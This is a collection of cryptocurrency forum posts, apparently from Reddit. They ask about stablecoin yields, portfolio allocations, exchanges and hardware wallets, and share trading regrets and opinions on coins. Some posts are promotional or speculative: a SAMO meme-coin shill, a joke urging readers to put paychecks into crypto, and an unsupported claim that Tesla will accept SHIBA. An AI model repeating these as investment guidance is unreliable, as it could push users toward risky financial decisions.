Please advise. I've looked into the polygon route but I believe Coinbase exclusively use eth network.

Countless times have I heard do not depend on the advice given on this sub but here we go again.

Ive recently been thinking about my exit stratergy of taking profits from the coins I have been holding for over a year. By no means am I done with holding, but come to think of it I never sat down and thought about how I would go about storing profits/withdrawing funds.

Ive never really utilised stablecoins however I think they will play and essential part in remaining on the sidelines when I eventually take some profits.

Which platforms that are  well established offer the best returns (APY%)  for stablecoins? Is Compound a better way to earn interest on my bag?

Any advice or info would be massively appreciated, even a year into this scene I find Im learning something everyday!

I plan to invest in crypto and I would like to have a diversified portfolio. What do you think of this allocation:

* BTC - 30%
* ETH - 20%
* ADA - 13.33%
* DOT - 13.33%
* SOL - 13.33%
* UNI - 2%
* MKR - 2%
* AAVE - 2%
* COMP - 2%
* SNX - 2%

The idea behind it was the following:

* Invest 50% in well-established cryptocurrencies (Bitcoin and Ethereum)
* Invest 40% in proof-of-stake cryptocurrencies (Cardano, Polkadot and Solana)
* Invest 10% in DeFi tokens (Uniswap, Maker, Aave, Compound and Synthetix)

What do you think of this allocation? Is there any crypto that you believe is missing or should be removed from my allocation?

 Hey!

I'm on F1 visa in the US and want to get started investing in crypto. I currently use Robinhood for stocks because it's quite beginner-friendly (I'm a beginner). However, it only has very few cryptocurrency listed. I'm here for your opinions on the best exchange keeping keeping 2 things in mind.

&amp;#x200B;

1. Tax Documents: Robinhood provides tax documents that makes reporting very easy, especially as I'm on F1 visa. Are there any exchanges that can match Robinhood for this?
2. Beginner Friendliness: Although, I'm going to eventually learn more about crypto along the way, I want to start easy. Not as important as number 1.

What do you recommend? 

Thanks!

As the title says, I didn't see many posts, if any about it here at r/CC. It looks way better than some other "mainstream" altcoins. Their wallet and user interface are one of the best I've seen so far. Very easy to use for most of the people, I believe. Their partners are promising too. 
Didn't get rich, but I invest in it since launch so I made some money on it.

I just wonder fellow redditors, what do you think about this? 
I would like to hear your thoughts about it.

And it does not anything in common with the Kardashians. Please leave those people out of this discussion. I'm not a man of culture and know nothing about them. Yeah, it's funny associating this with them but please don't.

I just believe it's an interesting project. Nothing more.

Im a hodler and i cant see myself spending my crypto just to get back a small percentage, you are always going to end up spending more currency than what you get back and thats what bothers me in the long run of using for my every day purchases and bills. 

Thats what my debit card or cash is for. Anyone else share similar views or am i out there on my own with a dumb opinion? 

Besides i do mot trust CB with anything besides buying the currency an immediately transferring them to my wallets, i just do not believe that they have the customer in their best interest. Their fees on the regular platform where the card will be is just too much for me.

Feel free to downvote me, that is your right, who am I to tell you what you should do with your money?  

But just as you have the right to do with your money whatever you want so do I have the right to express my opinion on this sub.  I am seriously dissapointed with the ammount of posts shilling shitcoins, memecoins and people supporting it.  

Some of you will make good money on it, most of you probably won't. If you go with it for a long run I am sure you will get rekt.  

People who put money into this just read how someone made a huge profit, avoid reading how many people lost money in the same way not even a month ago, people on this sub would recommend not gambling on shitcoins, and now I have a feeling that everyone here are for the shitcoin gamble.Where did all those people from whom I could learn disappeared?

And yes, most of us are here for the money but also for decentralization and adoption. Is this the adoption we asked for?

I used to mine ETH back in 2017 and i spent it all back then. September 2020 i got back into mining and i stopped because i was just watching the profitability in USD and i didn't think it was worth it, of course i was wrong (56MH/s). In January i got my friends to join me in starting mining again and we were making some decent profits. I bought some doge at 4 cents and sold at 5 cents. When the first blowing up happened i fomo'd again and again stressing my self out, being obsessed with it. I managed to make some profits (out of luck really). I was just chasing one pump after another. Then i decided to invest 2000 euros into crypto (BTC price was at 44400euros). I knew i had to just buy ETH and didn't, just bought BTC and hold on to it.  


I used to study nothing about how even trading works. I used binance lite (imagine the stupidity) day trading (losing money). Literally days before the big crash earlier this year i was the kind of guy to redeem the BTC stake i had with the money, along with my ETH profits from mining and buy WINk with them (just by literally hearing about it from a friend's friend that it would double soon). Back then i didn't know anything about stop loss (and who am i kidding? i still dont). I was the most obsessed out of my whole group of friends about it. I had sleepless nights about the next pump or what am i doing wrong. I fomo'd into everything. And lost 80% of my portfolio in two months.   


Now seeing where i would have been if i just bought the damn ETH and mined some more. I still try to replenish my losses, and i have to some extent (not there yet). Although now i DMOR, and managed to get a lot of coins before they pump, i still fomo and stop hodling for no reason. Yesterday without even thinking about it i just took my whole ETH holding that took months to mine, and threw them at MANA at $3.8. WTF is even wrong with me?  


Don't mind me. And sorry for busting your balls this late at night. I just had to express some things. Don't be like me. This is gambling, not investing. And you never long term win at gambling. These have cost me money, nights of sleep, and the quality of my relationship. Besides the stress of course. Hope we can all stop being like me.

Was just thinking. 

Im in my mid 40s, have been an investor in the stock market for over a decade, and have been investing in crypto for the last year. I have actually moved money out of the stock market to put into the crypto market. 
I am not alone.
Many of my colleagues have done the same and the more peers that I speak to, I find, have done the same or are interested to doing the same.

It is my understanding that my demographic makes up a large percentage of retail  crypto adoption and for my personal experience, in my micro world, I can concur this to be accurate.
It is also my understanding that the even greater demographic investing in and participating in the industry, is of those of younger generations than my own. 

First; God bless you all!

Secondly; doesnt it stand to reason, that if the next wave of serious investors (the 40s-50s), and presumably every forthcoming generation, is putting their money into crypto and not stocks, that there will be so little volume in the stock market that collapse is imminent??

Doesnt it stand to reason that the crypto market shall ultimately replace the stock market?

Hey everyone, when I first started with crypto back in 2016 I only used it to make money and didnt use it. Yes crypto is great for making money.

But the technology behind it is even more amazing. In the last 5 years I learned more and more about crypto and found projects I believe in. Totally didnt become rich from anything in the last 5 years, because I cant invest much. But I like how even little money can grow to some more. 

I use crypto mostly now for my daily payments and online payments and I am wondering if more people are doing this currently ? I really enjoy paying with crypto it is getting more simple every day.

Do you use crypto for payments ? And why do/dont you ?

Hi All,

What all did you do to understand the crypto landscape? Every other day, there is a new offering coming up. some layer 1, some layer 2, and who knows what. plus there are meme offerings like Doge &amp; recently Shiba (unbelievable returns in a year.. seriously unbelievable) and now I hear Hex which is offering 40% APY !!!! 

I have a small % in crypto via coinbase, however, most of the action these days is on the coins which are not on these exchanges. I read about opening a metamask wallet - which I did, but pretty much get lost after that. 

 How can one get a fair understanding? Need help. Any responses would be much appreciated.

  It seems like they are an embodiment of why people that don't understand the true value of crypto hate it so much.  Like, are they not basically just a ponzi scheme that ruins the environment as a fun bonus?  I love the idea of cryptos that actually serve a purpose, especially more environmentally friendly ones like POS, but it seems like things like this only serve to tarnish the name of crypto and give it's critics a caricaturized example to shine a spotlight on.  

  I'm not, however unable to learn and would love to hear opposing views so I can better educate myself on the subject.  Any feedback is welcome 

thx

It seems that tezos has been losing ground to coins such as eth and solana. It used to be in the top 10 and 15 but it seems more and more like tezos might just fade into obscurity. It has a lot more support on Twitter than It does here on reddit but I don't hear much real analysis of the coin other than "tezos til we bezos".

I'm aware of some of their partnerships and how they have managed to grab artists like doja cat and the game, and a partnership with redbull but will this be enough when so many other projects are landing partnerships with big name companies?

 Looking to see what you guys think about the potential of tezos and whether or not it will be able to stay relevant in the coming years. Anyone have any serious pros and cons for the coin?

///NOTE: This post did so well in r/Solana - #1 Hottest post - that I felt people in this subreddit might also find the info useful. Thanks for the support all ///

We're all aware of the dog coin hype at the moment, so I thought it was worth making y'all aware of what's happening with Solana in this space.

DOGE is to Bitcoin as
SHIB is to Ethereum as
SAMO is to Solana.

If you're bullish on SOL, and you missed the train on the first two, then this is a good way to get in early on the Solana ecosystem's biggest community coin, and #4 biggest meme coin in the entire crypto space (yet only $0.4bn market cap).

There's tons of stuff happening in the space: 1) 500M coin burn on a random day each month for the next 6 months. 2) SAMO NFTs to be released with buy-back and burn mechanism built in 3) Metaverse projects coming soon 4) A super motivated and efficient dev team who were heavily involved Solana's Ignition Hackathon.

The community's super friendly and welcoming at the moment, so post in the r/SamoyedCoin subreddit if you have any questions  

I strongly believe that (however you feel about meme/dog coins) the hype from SAMO could be a fun yet powerful advertisement for the Solana blockchain - which as we all know is the fastest blockchain existing right now. It was my first time actually using the Solana blockchain and Phantom wallet (outside of CEXs) and I was blown away with how simple it is. If it can do this for me, who was already a SOL advocate, then it can definitely do this for millions more users.

As the fastest and cheapest to transact dogcoin existing right now, this should be all the info you need to make the call. See you there 

NOTE: 

- This post did well in the Solana subreddit so I felt people here might also want to see it. 

- SAMO's available on ORCA, Raydium, STEP and (as of a few hours ago) gate.io . You can also use Jupiter Aggregator to compare the best prices. I've also just been informed by a commenter that you can use the Coin98 mobile app to transfer SOL to and get SAMO, if you don't want to deal with web browsers for your DEX swapping!

There's quite a bit of critique toward Tether I see these days. So I wanted to discuss what is people's favorite stable and if possible what is the reasoning behind it. Personally I like UST, but if hard pressed to say why I would struggle, another reason why I would like to have this conversation,.
I haven't used Stable Coins that much myself, my funds on the exchange I prefer to keep in BTC and if available trade btc pairs and only if that nor possible I would swap it usually into Tether actually, but because it's done for specific trade funds don't stay there for long, couple hours at most.
Also I would love to hear if someone willing to share their strategy when it comes to Stables.

Hope you are strapped in, as No Sell November and Moonvember have just started in the EU.

Brace for massive gains of your favourite crypto, even if it is some memecoin. We going to the Moon, if you just believe in it hard enough.

Daddy Bitcoin will reach unknown heights, ETH will shatter through every imaginable resistance, ADA will finally do....something. Even XLM will stop being a stablecoin and fulfil the legacy of its rocket logo.

Maybe even stablecoins will go to $2, I don't know. What I do now is, that we have the best gains of the year ahead of us and you people need every dose of Hopium you can find, so here it is.

Also, since it's the first, put your paychecks into crypto. This is financial advice. Maybe.

I ask myself this question a lot and in my case the answer is always yes. I think back at the explosive market rise last year. It was insane. Folks that bought in 2015 -17 were long overdue. That rise brought in a shitload of new investors into this market. Many of them bought at ATH and in some cases they are still waiting to see green portfolios. So I ask myself what if this is it for the next 3 - 5 regarding price? I mean nothing is guaranteed. We all want to moon or create wealth for ourselves and our family. Its one of the reasons why we are here. So let's say the market does bear for the a long time&gt; many will be exhausted  and may just give up. What about you? Would you still be here with me HODLing?

I'm not planning on going anywhere but I did listen to this long time bitcoiner on a podocast say hodling is hard. I mean its easy but its really hard. Its like being fit. Being fit isn't hard. You know what to do you just have to do it and it's not always as easy as said and done. 

Wherever this market goes which of course we all want to go up and stay eternally green I am happy I made the transition to crypto and i hope you are too. Cheers and patience. Good things are going to happen.

So, 

everybody always tells you: Get a Hardware Wallet, its way safer!

But ... which one?

How do they work?

And how do you actually use it?

What are you protected from by the wallet?

Are there any downsides of using a Hardware Wallet? Some transaction Fees?

Do you chose you wallet based on the Crypto you want to buy?

I - like many others - joined the crypto space this year and started by simply creating accounts on exchanges. Some of my crypto went to the natives wallets of some products, others are still in the exchange. Back when I started I told my its note useful to buy a security that costs 100$ for a 200$ investments. Well right now its a bit above 200$ and I might consider more security in the near future. Things that keep me from transitioning to a hardware wallet are all the questions above. 

What I am searching for is like a FAQ Hardware Wallet, maybe even experiences?

What Hardware Wallet can you guys shill?

In the coming months you'll likely make gains you never dreamed of. That money isn't yours until you sell these extremely volatile assets, so don't be scared of doing it. Sure you might potentially miss out on another few hundred %, but in a year from now everything will likely be worth less than it is right now.

HODL is all well and good, but we're still only up ~200% from the 2017 top. People who sold then and bough the 2018 bottom are up ~1800%.

If you're sitting on life changing money right now, please please take some profit. Crypto will always be there should you choose to reinvest.

I was browsing for Teslas and looking into how a payment solution is implemented, check out what I found:

https://preview.redd.it/ogm30snk7vw71.png?width=1028&amp;format=png&amp;auto=webp&amp;s=0c11b595bb73b4da0c4bfbd87d549219c7226c3f

Looks like Tesla is planning to accept SHIBA tokens... check it for yourself, look for SHIBA inside that file. Why would Tesla prepare to accept SHIBA, this is real, it can't be fake... This is unbelievable, everybody thinking about DOGE, but SHIB is the real deal! There is also bitcoin right there, so they are likely planning to accept BTC again...
